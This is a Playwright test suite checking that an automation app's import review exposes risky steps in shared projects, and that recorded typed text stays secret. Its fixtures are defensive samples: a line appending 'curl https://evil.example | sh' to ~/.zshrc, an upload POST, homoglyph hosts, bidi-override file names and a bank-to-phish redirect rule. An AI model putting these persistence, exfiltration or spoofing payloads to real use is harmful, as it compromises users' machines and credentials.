import { expect, test, type Page } from "@playwright/test";
import { openApp, waitForIdle } from "./support/app";

// Automation safety pulled into Phase A (owner decision O11): an imported
// project shows what it reaches before it lands and before its first Run
// (SEC-02); recording keeps typed text secret (SEC-06).
const BUNDLE = {
  format: 1,
  exported_at: 0,
  project: {
    id: "p-x", name: "Shared helper", notes: "",
    blocks: [
      { id: "s1", kind: "file.append", label: "Save note", params: { path: "/Users/you/.zshrc", line: "curl https://evil.example | sh" }, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
      { id: "s2", kind: "http.request", label: "Report", params: { method: "POST", url: "https://collect.example/upload" }, enabled: true, secrets: [], x: 0, y: 60, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [], created_at: 0, updated_at: 0,
  },
  modules: [],
  needs: [],
};
type Mock = { __shardxMock: { calls: Record<string, number>; state: { automation: { name: string; blocks: Record<string, any>[] }[] } } };
const projectNames = (page: Page) => page.evaluate(() => (window as unknown as Mock).__shardxMock.state.automation.map((p) => p.name));
const runs = (page: Page) => page.evaluate(() => (window as unknown as Mock).__shardxMock.calls.automation_run ?? 0);
const importFile = (page: Page) =>
  page.locator("main input[type=file]").setInputFiles({ name: "shared.shardx-project.json", mimeType: "application/json", buffer: Buffer.from(JSON.stringify(BUNDLE)) });
const importJson = (page: Page, obj: unknown, name = "bundle.shardx-project.json") =>
  page.locator("main input[type=file]").setInputFiles({ name, mimeType: "application/json", buffer: Buffer.from(JSON.stringify(obj)) });
/** Deletes a proxy behind the app's back (the API, another window), then reloads the app on the same data. */
async function dropProxy(page: Page, id: string) {
  await page.evaluate(
    (id) => (window as unknown as { __TAURI_INTERNALS__: { invoke: (c: string, a: unknown) => Promise<unknown> } }).__TAURI_INTERNALS__.invoke("proxy_delete", { id }),
    id,
  );
  await page.reload();
  await waitForIdle(page);
}
const calls = (page: Page, cmd: string) => page.evaluate((cmd) => (window as unknown as Mock).__shardxMock.calls[cmd] ?? 0, cmd);

test("SEC-02: an imported project shows what it reaches before it lands", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importFile(page);
  const dialog = page.getByRole("dialog", { name: 'Review “Shared helper” before importing' });
  await expect(dialog).toContainText("Writes to the file /Users/you/.zshrc");
  await expect(dialog).toContainText("Sends a POST request to https://collect.example/upload");
  await expect(dialog.getByRole("button", { name: "Cancel" })).toBeFocused();
  await dialog.getByRole("button", { name: "Cancel" }).click();
  expect(await projectNames(page)).not.toContain("Shared helper");
  await importFile(page);
  await page.getByRole("dialog").getByRole("button", { name: "Import" }).click();
  await expect.poll(() => projectNames(page)).toContain("Shared helper");
});

test("SEC-02: its first Run shows the review once more", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importFile(page);
  await page.getByRole("dialog").getByRole("button", { name: "Import" }).click();
  // The imported project opens in the editor (the list's own Run buttons are
  // gone with it). (The console panel has its own, disabled, "Run" button
  // further down; the toolbar's is first in the DOM.)
  await expect(page.getByRole("textbox", { name: "Project name" })).toHaveValue("Shared helper");
  await page.getByRole("button", { name: "Run", exact: true }).first().click();
  const dialog = page.getByRole("dialog", { name: 'Run “Shared helper” for the first time?' });
  await expect(dialog).toContainText("/Users/you/.zshrc");
  await dialog.getByRole("button", { name: "Run" }).click();
  await expect.poll(() => runs(page)).toBe(1);
  expect(await page.evaluate(() => localStorage.getItem("shardx.automation.unreviewed"))).toBe("[]");
});

// Fix round 1, item 2: the Automation page had two more paths onto this
// computer's own IP that useProfile.startStop's guard never covered.
test("LiveView Start refuses a profile whose proxy was deleted", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await dropProxy(page, "px-jp-1"); // FB Ads acc-02's proxy
  await page.getByText("Pricing scrape 6h", { exact: true }).click();
  await page.getByRole("button", { name: "Open browser" }).click();
  await page.getByRole("combobox", { name: "Choose a profile…", exact: true }).click();
  await page.getByRole("option", { name: "FB Ads acc-02", exact: true }).click();
  await page.getByRole("button", { name: "Start", exact: true }).click();
  await expect(page.locator("[data-toast]").filter({ hasText: "won’t start: its proxy was deleted" })).toBeVisible();
  await expect(page.getByRole("button", { name: "Start", exact: true })).toBeVisible(); // never went live
  expect(await calls(page, "automation_launch")).toBe(0);
});

test("Run refuses when a run profile's proxy was deleted", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await page.evaluate(() => {
    const w = window as unknown as { __shardxMock: { state: { automation: { name: string; blocks: unknown[] }[] }; save: () => void } };
    const proj = w.__shardxMock.state.automation.find((p) => p.name === "Pricing scrape 6h")!;
    proj.blocks.push(...["c31d92f1"].map((id, i) => ({ id: `use-${i}`, kind: "profile.use", label: "", params: { id }, enabled: true, secrets: [], x: 2000, y: 80 + i * 100, on_done: "next", on_fail: "stop" }))); // the run opens FB Ads acc-02
    w.__shardxMock.save();
  });
  await dropProxy(page, "px-jp-1");
  await page.getByText("Pricing scrape 6h", { exact: true }).click();
  // No wait: Run reads the profiles and proxies itself, so a click the moment
  // the editor opens is still checked.
  await page.getByRole("button", { name: "Run", exact: true }).first().click();
  await expect(page.locator("[data-toast]").filter({ hasText: "won’t start: its proxy was deleted" })).toBeVisible();
  expect(await runs(page)).toBe(0);
});

// Task 11 fix round 2: these two Start paths replicated Task 8's
// proxy-missing guard but never asked O9a's question — a no-proxy profile
// went straight to automationLaunch/automationRun, whatever the Settings
// switch said.
test("LiveView Start asks before a no-proxy profile opens the browser, and Cancel leaves it idle", async ({ page }) => {
  await openApp(page, { section: "automation", askDirect: true });
  await page.getByText("Pricing scrape 6h", { exact: true }).click();
  await page.getByRole("button", { name: "Open browser" }).click();
  await page.getByRole("combobox", { name: "Choose a profile…", exact: true }).click();
  await page.getByRole("option", { name: "Sandbox", exact: true }).click();
  await page.getByRole("button", { name: "Start", exact: true }).click();
  const dialog = page.getByRole("dialog", { name: "Start “Sandbox” without a proxy?" });
  await dialog.getByRole("button", { name: "Cancel" }).click();
  await expect(page.getByRole("button", { name: "Start", exact: true })).toBeVisible(); // never went live
  expect(await calls(page, "automation_launch")).toBe(0);
});

test("with the direct-start preference off, LiveView Start asks nothing", async ({ page }) => {
  await openApp(page, { section: "automation" }); // askDirect defaults false: the preference is off
  await page.getByText("Pricing scrape 6h", { exact: true }).click();
  await page.getByRole("button", { name: "Open browser" }).click();
  await page.getByRole("combobox", { name: "Choose a profile…", exact: true }).click();
  await page.getByRole("option", { name: "Sandbox", exact: true }).click();
  await page.getByRole("button", { name: "Start", exact: true }).click();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await expect.poll(() => calls(page, "automation_launch")).toBe(1);
});

test("Project Run asks before a no-proxy run profile starts, and Cancel runs nothing", async ({ page }) => {
  await openApp(page, { section: "automation", askDirect: true });
  await page.evaluate(() => {
    const w = window as unknown as { __shardxMock: { state: { automation: { name: string; blocks: unknown[] }[] }; save: () => void } };
    const proj = w.__shardxMock.state.automation.find((p) => p.name === "Pricing scrape 6h")!;
    proj.blocks.push(...["f62a9d43"].map((id, i) => ({ id: `use-${i}`, kind: "profile.use", label: "", params: { id }, enabled: true, secrets: [], x: 2000, y: 80 + i * 100, on_done: "next", on_fail: "stop" }))); // the run opens Sandbox: no proxy
    w.__shardxMock.save();
  });
  // The mutation above bypasses the app, so a reload is needed for the
  // editor's own project state (loaded once already) to see it.
  await page.reload();
  await waitForIdle(page);
  await page.getByText("Pricing scrape 6h", { exact: true }).click();
  await page.getByRole("button", { name: "Run", exact: true }).first().click();
  // The project's own "Use profile" steps open profiles with a proxy too, so
  // the question is the one for a group.
  const dialog = page.getByRole("dialog", { name: "1 of these profiles has no proxy" });
  await dialog.getByRole("button", { name: "Cancel" }).click();
  expect(await runs(page)).toBe(0);
});

// Task 11 fix round 3: a run can't start a subset of its profiles, so its
// question must never offer "Skip those" — the button `launchMany`'s
// identical dialog shows implies exactly that, and Project Run silently ran
// nothing if it was pressed, telling the person nothing.
test("Project Run's question never offers Skip those; Cancel runs nothing", async ({ page }) => {
  await openApp(page, { section: "automation", askDirect: true });
  await page.evaluate(() => {
    const w = window as unknown as { __shardxMock: { state: { automation: { name: string; blocks: unknown[] }[] }; save: () => void } };
    const proj = w.__shardxMock.state.automation.find((p) => p.name === "Pricing scrape 6h")!;
    proj.blocks.push(...["f62a9d43", "aed41005"].map((id, i) => ({ id: `use-${i}`, kind: "profile.use", label: "", params: { id }, enabled: true, secrets: [], x: 2000, y: 80 + i * 100, on_done: "next", on_fail: "stop" }))); // the run opens Sandbox (no proxy) + Etsy craft shop (proxied)
    w.__shardxMock.save();
  });
  await page.reload();
  await waitForIdle(page);
  await page.getByText("Pricing scrape 6h", { exact: true }).click();
  await page.getByRole("button", { name: "Run", exact: true }).first().click();
  const dialog = page.getByRole("dialog", { name: "1 of these profiles has no proxy" });
  await expect(dialog.getByRole("button", { name: "Skip those" })).toHaveCount(0);
  await dialog.getByRole("button", { name: "Cancel" }).click();
  expect(await runs(page)).toBe(0);
});

test("with the direct-start preference off, Project Run asks nothing", async ({ page }) => {
  await openApp(page, { section: "automation" }); // askDirect defaults false: the preference is off
  await page.evaluate(() => {
    const w = window as unknown as { __shardxMock: { state: { automation: { name: string; blocks: unknown[] }[] }; save: () => void } };
    const proj = w.__shardxMock.state.automation.find((p) => p.name === "Pricing scrape 6h")!;
    proj.blocks.push(...["f62a9d43"].map((id, i) => ({ id: `use-${i}`, kind: "profile.use", label: "", params: { id }, enabled: true, secrets: [], x: 2000, y: 80 + i * 100, on_done: "next", on_fail: "stop" }))); // the run opens Sandbox: no proxy
    w.__shardxMock.save();
  });
  await page.reload();
  await waitForIdle(page);
  await page.getByText("Pricing scrape 6h", { exact: true }).click();
  await page.getByRole("button", { name: "Run", exact: true }).first().click();
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await expect.poll(() => runs(page)).toBe(1);
});

const steps = (page: Page, name: string) =>
  page.evaluate((name) => (window as unknown as Mock).__shardxMock.state.automation.find((p) => p.name === name)?.blocks ?? [], name);
/** Manual save (Task 9): recorded steps are stored on Save. The header's
 *  button, not the key: the live view's keys go to its browser. */
const saveButton = (page: Page) => page.locator("[data-editor-save] button");
const saveProject = (page: Page) => saveButton(page).click();

test("SEC-06: typed text is recorded as one secret step with a plain label; a URL's query stays out of its label", async ({ page }) => {
  test.slow(); // a restart, then keys typed 300 ms apart: past 30 s on a busy dev server
  await openApp(page, { section: "automation" });
  await page.getByRole("button", { name: "New project", exact: true }).click();
  await expect(page.getByRole("textbox", { name: "Project name" })).toBeFocused();
  await page.keyboard.type("Login flow");
  // Creating it opens it in the editor, its name in the title field.
  await expect(page.getByRole("textbox", { name: "Project name" })).toHaveValue("Login flow");
  await page.getByRole("button", { name: "Open browser" }).click();
  await page.getByRole("combobox", { name: "Choose a profile…" }).click();
  await page.getByRole("option", { name: "Amazon US seller" }).click();
  await page.getByRole("button", { name: "Start", exact: true }).click();
  // The mock has it open without automation, so the launcher offers a restart.
  await page.getByRole("dialog", { name: "“Amazon US seller” is open without automation" })
    .getByRole("button", { name: "Restart" }).click();
  await page.getByRole("button", { name: "Record", exact: true }).click();
  await page.evaluate(() => (window as unknown as { __shardxMock: { emit: (e: string, p: unknown) => void } }).__shardxMock.emit(
    "automation:navigated", { profile_id: "a78a0eea", url: "https://shop.example/login?token=abc123#step2" },
  ));
  const canvas = page.locator("canvas[tabindex='0']");
  await canvas.focus();
  // Spaced out: each key goes to the browser and comes back as a step.
  await page.keyboard.type("hunter2", { delay: 300 });
  await page.keyboard.press("Enter");
  await expect(page.locator("[data-step-card]")).toHaveCount(3, { timeout: 10_000 });
  await saveProject(page);
  await expect.poll(() => steps(page, "Login flow")).toHaveLength(3);
  const [open, typed, enter] = await steps(page, "Login flow");
  expect(open.label).toBe("Open https://shop.example/login");
  expect(typed).toMatchObject({ kind: "type", label: "Type text", secrets: ["text"] });
  expect(typed.params.text).toBe("hunter2");
  expect(enter).toMatchObject({ kind: "press", label: "Press Enter" });
});

// Fix round 1: six Important findings from review.

// Finding 1: project.rules (mounted before the first navigation, and able to
// redirect, fulfill or edit responses) must be reviewed too, not just blocks.
const RULES_BUNDLE = {
  format: 1, exported_at: 0,
  project: {
    id: "p-rules", name: "Rule risk", notes: "",
    blocks: [
      { id: "r1", kind: "click", label: "Click go", params: { selector: "#go" }, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [
      // A blank url is the same as an absent one (fix round 2, item A): the
      // match falls back to host. The action is shown in words, capitalized,
      // as a full sentence (fix round 2, item I) — never the raw "fulfill".
      { match: { url: "", host: "*.bank.example" }, action: { type: "fulfill", status: 200, responseBody: "{}" } },
    ],
    created_at: 0, updated_at: 0,
  },
  modules: [], needs: [],
};

test("finding 1 / round2 A+I: a host-only rule matches by host, and its action reads as a capitalized, translated sentence", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importJson(page, RULES_BUNDLE);
  const dialog = page.getByRole("dialog", { name: 'Review “Rule risk” before importing' });
  await expect(dialog).toContainText("Answers requests matching *.bank.example.");
});

test("round2 I (zh): the rule's action shows in Chinese, never the raw English id", async ({ page }) => {
  await page.addInitScript(() => localStorage.setItem("shardx.lang", "zh"));
  await openApp(page, { section: "automation" });
  await importJson(page, RULES_BUNDLE);
  const dialog = page.getByRole("dialog");
  await expect(dialog).toContainText("*.bank.example");
  await expect(dialog).toContainText("自行响应");
  const text = await dialog.locator("[data-review-lines]").innerText();
  expect(text).not.toMatch(/redirect|fulfill|editResponse|setHeaders|continue|block/i);
});

// Finding 2: reviewLines was missing several capabilities its own doc
// comment claims to cover.
const CAPS_BUNDLE = {
  format: 1, exported_at: 0,
  project: {
    id: "p-caps", name: "Capabilities", notes: "",
    blocks: [
      { id: "c1", kind: "screenshot", label: "Shot", params: { path: "/Users/you/shot.png" }, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
      { id: "c2", kind: "proxy.set", label: "Set proxy", params: { proxy: "socks5://10.0.0.1:1080" }, enabled: true, secrets: ["proxy"], x: 0, y: 60, on_done: "next", on_fail: "stop" },
      { id: "c3", kind: "profile.delete", label: "Delete", params: { id: "old-profile" }, enabled: true, secrets: [], x: 0, y: 120, on_done: "next", on_fail: "stop" },
      { id: "c4", kind: "db.open", label: "Open db", params: { driver: "sqlite", target: "", path: "/data/app.sqlite" }, enabled: true, secrets: [], x: 0, y: 180, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [], created_at: 0, updated_at: 0,
  },
  modules: [], needs: [],
};

test("finding 2: screenshot path, proxy change, profile delete and a target-less db.open all show", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importJson(page, CAPS_BUNDLE);
  const dialog = page.getByRole("dialog", { name: 'Review “Capabilities” before importing' });
  await expect(dialog).toContainText("Saves a screenshot to /Users/you/shot.png");
  await expect(dialog).toContainText("Changes the profile’s saved proxy");
  await expect(dialog).toContainText("Deletes the profile old-profile");
  // target is empty, so db.open falls back to params.path, as the runner does.
  await expect(dialog).toContainText("Opens a sqlite database: /data/app.sqlite");
});

// Finding 3: AltGr (Control+Alt) and a lone Option/Alt key can produce a
// printable character; only Meta, or Control without Alt, should keep a
// character out of the typed-text step.
test("finding 3: Alt-only and Control+Alt characters merge into typed text, not separate Press steps", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await page.getByRole("button", { name: "New project", exact: true }).click();
  await expect(page.getByRole("textbox", { name: "Project name" })).toBeFocused();
  await page.keyboard.type("AltGr flow");
  // Creating it opens it in the editor, its name in the title field.
  await expect(page.getByRole("textbox", { name: "Project name" })).toHaveValue("AltGr flow");
  await page.getByRole("button", { name: "Open browser" }).click();
  await page.getByRole("combobox", { name: "Choose a profile…" }).click();
  await page.getByRole("option", { name: "Amazon US seller" }).click();
  await page.getByRole("button", { name: "Start", exact: true }).click();
  // The mock has it open without automation, so the launcher offers a restart.
  await page.getByRole("dialog", { name: "“Amazon US seller” is open without automation" })
    .getByRole("button", { name: "Restart" }).click();
  await page.getByRole("button", { name: "Record", exact: true }).click();
  const canvas = page.locator("canvas[tabindex='0']");
  await canvas.focus();
  const press = (key: string, mods: { altKey?: boolean; ctrlKey?: boolean }) =>
    page.evaluate(({ key, mods }) => {
      document.querySelector("canvas[tabindex='0']")!.dispatchEvent(
        new KeyboardEvent("keydown", { key, bubbles: true, cancelable: true, ...mods }),
      );
    }, { key, mods });
  // Spaced out, as with real typing: each key goes to the browser and comes
  // back as a step before the next is sent.
  await press("a", {});
  await page.waitForTimeout(500);
  await press("@", { altKey: true });
  await page.waitForTimeout(500);
  await press("@", { altKey: true, ctrlKey: true });
  await page.waitForTimeout(500);
  await press("b", {});
  // Every character lands in the same one block, so its length never changes;
  // save while keys still land, and poll the stored text until the last has.
  await expect.poll(async () => {
    if (await saveButton(page).isEnabled()) await saveProject(page);
    return (await steps(page, "AltGr flow"))[0]?.params.text;
  }, { timeout: 10_000 }).toBe("a@@b");
  const [typed] = await steps(page, "AltGr flow");
  expect(typed).toMatchObject({ kind: "type", label: "Type text", secrets: ["text"] });
});

// Finding 4: reviewLines running outside the try meant a malformed bundle
// failed silently instead of showing the error toast it used to.
const imports = (page: Page) => page.evaluate(() => (window as unknown as Mock).__shardxMock.calls.automation_import ?? 0);

test("finding 4: a malformed bundle shows the error toast and never imports", async ({ page }) => {
  await openApp(page, { section: "automation" });
  const before = await imports(page);
  await importJson(page, { project: { blocks: {} } });
  await expect(page.locator("[data-toast]")).toBeVisible();
  expect(await imports(page)).toBe(before);
  await expect(page.getByRole("dialog")).toHaveCount(0);
});

// Finding 5: values are shown literally, so a homoglyph host or a bidi
// override could make the review say something other than what is reached.
const HOMOGLYPH_BUNDLE = {
  format: 1, exported_at: 0,
  project: {
    id: "p-homo", name: "Look-alike", notes: "",
    blocks: [
      { id: "h1", kind: "http.request", label: "Ping", params: { method: "GET", url: "https://bаnk.example/" }, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
      { id: "h2", kind: "file.append", label: "Note", params: { path: "/Users/you/‮gnp.exe", line: "x" }, enabled: true, secrets: [], x: 0, y: 60, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [], created_at: 0, updated_at: 0,
  },
  modules: [], needs: [],
};

test("finding 5: a homoglyph host shows in punycode, and a bidi override is stripped", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importJson(page, HOMOGLYPH_BUNDLE);
  const dialog = page.getByRole("dialog", { name: 'Review “Look-alike” before importing' });
  await expect(dialog).toContainText("xn--");
  const text = await dialog.locator("[data-review-lines]").innerText();
  expect(text).not.toContain("‮");
  expect(text).toContain("/Users/you/gnp.exe");
});

// Finding 6: an http step with via: "host" leaves from this computer's own
// address, not the profile's proxy (the O10 identity leak) — the review must
// say so.
const VIA_HOST_BUNDLE = {
  format: 1, exported_at: 0,
  project: {
    id: "p-via", name: "Direct call", notes: "",
    blocks: [
      { id: "v1", kind: "http.request", label: "Call", params: { method: "GET", url: "https://api.example/whoami", via: "host" }, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [], created_at: 0, updated_at: 0,
  },
  modules: [], needs: [],
};

test("finding 6: an http step sent via: \"host\" says it leaves from this computer, not the profile's proxy", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importJson(page, VIA_HOST_BUNDLE);
  const dialog = page.getByRole("dialog", { name: 'Review “Direct call” before importing' });
  await expect(dialog).toContainText("from this computer’s own address, not the profile’s proxy");
  // round2 item I: the two sentences are joined with proper punctuation, not
  // smashed together.
  await expect(dialog).toContainText("https://api.example/whoami. This leaves");
});

// Fix round 2: findings 1 and 5 partly open, plus wording problems.

// Item B: every shown value goes through text() — the script.run file path,
// module ids and step labels, so a bidi override cannot hide in any of them.
const TEXT_EVERYWHERE_BUNDLE = {
  format: 1, exported_at: 0,
  project: {
    id: "p-text", name: "Text everywhere", notes: "",
    blocks: [
      { id: "t1", kind: "script.run", label: "Run helper", params: { file: "/scripts/‮cod.js", world: "isolated" }, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [], created_at: 0, updated_at: 0,
  },
  modules: [],
  module_files: [{ id: "helper‮mod", wasm: "" }],
  needs: [],
};

test("round2 B: a script.run file path and a module id are both bidi-stripped", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importJson(page, TEXT_EVERYWHERE_BUNDLE);
  const dialog = page.getByRole("dialog", { name: 'Review “Text everywhere” before importing' });
  await expect(dialog).toContainText("Runs the file /scripts/cod.js in the page (isolated world).");
  await expect(dialog).toContainText("Installs the module helpermod.");
  const text = await dialog.locator("[data-review-lines]").innerText();
  expect(text).not.toContain("‮");
});

// Items C + E: profile.delete with no id deletes the profile the project
// runs on; proxy.swap to "" is a direct connection, said in plain words, and
// is its own line (not the profile's saved proxy); proxy.residential groups
// with proxy.set/generate as changing the profile's saved proxy.
const SELF_AND_PROXY_BUNDLE = {
  format: 1, exported_at: 0,
  project: {
    id: "p-self", name: "Self and proxy", notes: "",
    blocks: [
      { id: "s1", kind: "profile.delete", label: "Delete self", params: {}, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
      { id: "s2", kind: "proxy.swap", label: "Go direct", params: { proxy: "" }, enabled: true, secrets: ["proxy"], x: 0, y: 60, on_done: "next", on_fail: "stop" },
      { id: "s3", kind: "proxy.residential", label: "Get residential", params: {}, enabled: true, secrets: [], x: 0, y: 120, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [], created_at: 0, updated_at: 0,
  },
  modules: [], needs: [],
};

test("round2 C+E: profile.delete with no id, a direct proxy.swap, and proxy.residential grouped with the saved-proxy line", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importJson(page, SELF_AND_PROXY_BUNDLE);
  const dialog = page.getByRole("dialog", { name: 'Review “Self and proxy” before importing' });
  await expect(dialog).toContainText("Deletes the profile the project runs on, with its data folder.");
  await expect(dialog).toContainText("Connects directly, from this computer’s own address, for this run.");
  await expect(dialog).toContainText("Changes the profile’s saved proxy.");
});

// Item D: a screenshot with no path is saved beside the run log (the
// runner's own fallback), so it is not worth reviewing.
const SCREENSHOT_NO_PATH_BUNDLE = {
  format: 1, exported_at: 0,
  project: {
    id: "p-shot", name: "Quiet screenshot", notes: "",
    blocks: [
      { id: "q1", kind: "screenshot", label: "Shot", params: {}, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [], created_at: 0, updated_at: 0,
  },
  modules: [], needs: [],
};

test("round2 D: a screenshot with no path imports with no review dialog", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importJson(page, SCREENSHOT_NO_PATH_BUNDLE);
  await expect(page.getByRole("dialog")).toHaveCount(0);
  await expect.poll(() => projectNames(page)).toContain("Quiet screenshot");
});

// Items F + G: the display must never rewrite a value (a literal backslash
// or a regex stays exactly as written), and via a named proxy says so.
const VALUES_BUNDLE = {
  format: 1, exported_at: 0,
  project: {
    id: "p-values", name: "Values as written", notes: "",
    blocks: [
      { id: "v1", kind: "http.request", label: "Backslash", params: { method: "GET", url: "https://bank\\.com/login" }, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
      { id: "v2", kind: "http.request", label: "Via proxy", params: { method: "GET", url: "https://api.example/data", via: "socks5://myproxy.example:1080" }, enabled: true, secrets: [], x: 0, y: 60, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [
      { match: { urlRegex: "^https://api\\.example/(secure|public)$" }, action: { type: "block", blockReason: "no" } },
    ],
    created_at: 0, updated_at: 0,
  },
  modules: [], needs: [],
};

test("round2 F+G: a literal backslash and a regex show unchanged; via a named proxy says so", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importJson(page, VALUES_BUNDLE);
  const dialog = page.getByRole("dialog", { name: 'Review “Values as written” before importing' });
  await expect(dialog).toContainText("https://bank\\.com/login");
  const text = await dialog.locator("[data-review-lines]").innerText();
  expect(text).not.toContain("https://bank/.com/login");
  await expect(dialog).toContainText("^https://api\\.example/(secure|public)$");
  await expect(dialog).toContainText("This goes through the proxy socks5://myproxy.example:1080.");
});

// Item H: a redirect rule and a traffic.redirect block both show their
// destination.
const REDIRECT_BUNDLE = {
  format: 1, exported_at: 0,
  project: {
    id: "p-redirect", name: "Redirects", notes: "",
    blocks: [
      { id: "d1", kind: "traffic.redirect", label: "Redirect ads", params: { url: "https://ads.example", to: "https://blackhole.example" }, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [
      { match: { url: "https://track.example" }, action: { type: "redirect", setUrl: "https://elsewhere.example" } },
    ],
    created_at: 0, updated_at: 0,
  },
  modules: [], needs: [],
};

test("round2 H: a redirect rule and a traffic.redirect block both name their destination", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importJson(page, REDIRECT_BUNDLE);
  const dialog = page.getByRole("dialog", { name: 'Review “Redirects” before importing' });
  await expect(dialog).toContainText("Redirects https://ads.example to https://blackhole.example.");
  await expect(dialog).toContainText("Redirects requests matching https://track.example to https://elsewhere.example.");
});

// Fix round 3: a traffic block matched only by host, a homoglyph host whose
// punycode also sits in the query, a whitespace-only via (the runner passes it
// on as a blank proxy, so the request goes out directly), a rule that rewrites
// the URL without being a "redirect", and a rule with no match.
const ROUND3_BUNDLE = {
  format: 1, exported_at: 0,
  project: {
    id: "p-round3", name: "Round three", notes: "",
    blocks: [
      { id: "r1", kind: "traffic.fulfill", label: "Answer bank", params: { url: "", host: "bank.example" }, enabled: true, secrets: [], x: 0, y: 0, on_done: "next", on_fail: "stop" },
      { id: "r2", kind: "http.request", label: "Look-alike", params: { method: "GET", url: "https://bаnk.example/?r=xn--bnk-6cd.example" }, enabled: true, secrets: [], x: 0, y: 60, on_done: "next", on_fail: "stop" },
      { id: "r4", kind: "traffic.setHeaders", label: "Look-alike host", params: { url: "any", host: "b\u0430nk.example" }, enabled: true, secrets: [], x: 0, y: 180, on_done: "next", on_fail: "stop" },
      { id: "r3", kind: "http.request", label: "Blank via", params: { method: "GET", url: "https://api.example/ip", via: " " }, enabled: true, secrets: [], x: 0, y: 120, on_done: "next", on_fail: "stop" },
    ],
    run: { threads: 1, loops: 1, hours: 0, profiles: [], start: "" },
    rules: [
      { match: { url: "https://bank.example" }, action: { type: "continue", setUrl: "https://phish.example" } },
      { action: { type: "block" } },
    ],
    created_at: 0, updated_at: 0,
  },
  modules: [], needs: [],
};

test("round3: host-only traffic blocks, a punycode note the query can't hide, a blank via, and URL-rewriting rules all show", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await importJson(page, ROUND3_BUNDLE);
  const dialog = page.getByRole("dialog", { name: 'Review “Round three” before importing' });
  await expect(dialog).toContainText("Answers requests to bank.example itself.");
  await expect(dialog).toContainText("(xn--bnk-6cd.example)");
  await expect(dialog).toContainText("https://api.example/ip. This leaves from this computer’s own address");
  await expect(dialog).toContainText("Redirects requests matching https://bank.example to https://phish.example.");
  await expect(dialog).toContainText("Blocks requests matching (empty).");
  // A bare host shows its punycode too; the runner treats url "any" as absent.
  await expect(dialog).toContainText("Changes headers or body on requests to b\u0430nk.example (xn--bnk-6cd.example).");
});

// Fix round 1 (I3): three click-only surfaces (the automation project row,
// the bookmark title cell and a TrafficPanel observed-request row) become
// real controls, reachable by Tab and activated by Enter/Space.
test("the automation project row opens from the keyboard", async ({ page }) => {
  await openApp(page, { section: "automation" });
  const row = page.locator("[role='listitem'][data-row-id]", { hasText: "Pricing scrape 6h" });
  await row.focus();
  await expect(row).toBeFocused();
  await page.keyboard.press("Enter");
  await expect(page.getByRole("button", { name: "Add step" })).toBeVisible();
});

test("a TrafficPanel observed request selects from the keyboard", async ({ page }) => {
  await openApp(page, { section: "automation" });
  await page.getByText("Pricing scrape 6h", { exact: true }).click();
  await expect(page.getByRole("button", { name: "Add step" })).toBeVisible();

  // Open the browser column, pick a target profile and show its Requests tab.
  // The trigger's accessible name stays "Choose a profile…" (it's a fixed
  // aria-label, not a live label), so confirm the pick by its visible text.
  await page.getByRole("button", { name: "Open browser" }).click();
  const trigger = page.getByRole("combobox", { name: "Choose a profile…" });
  await trigger.click();
  await page.getByRole("option", { name: "Sandbox" }).click();
  await expect(trigger).toHaveText("Sandbox");
  await page.getByRole("tab", { name: "Requests" }).click();

  // The mock's own event bus stands in for the real one (src/dev/mock/install.ts).
  const profileId = await page.evaluate(() => {
    const w = window as unknown as { __shardxMock: { state: { profiles: Record<string, { _meta: { id: string }; name: string }> } } };
    return Object.values(w.__shardxMock.state.profiles).find((p) => p.name === "Sandbox")!._meta.id;
  });
  await page.evaluate(({ id }) => {
    (window as unknown as { __shardxMock: { emit: (event: string, payload: unknown) => void } }).__shardxMock.emit(
      "automation:traffic-observed",
      { profile_id: id, params: { request: JSON.stringify({ id: "req-1", phase: "request", url: "https://example.com/a", method: "GET", resource: "xhr" }) } },
    );
  }, { id: profileId });

  const row = page.getByRole("button", { name: /example\.com\/a/ });
  await expect(row).toBeVisible();
  await row.focus();
  await expect(row).toBeFocused();
  await page.keyboard.press("Enter"); // selects it; a right-click alone opened its menu before
  await expect(row).toHaveClass(/row-fill-active/);
});
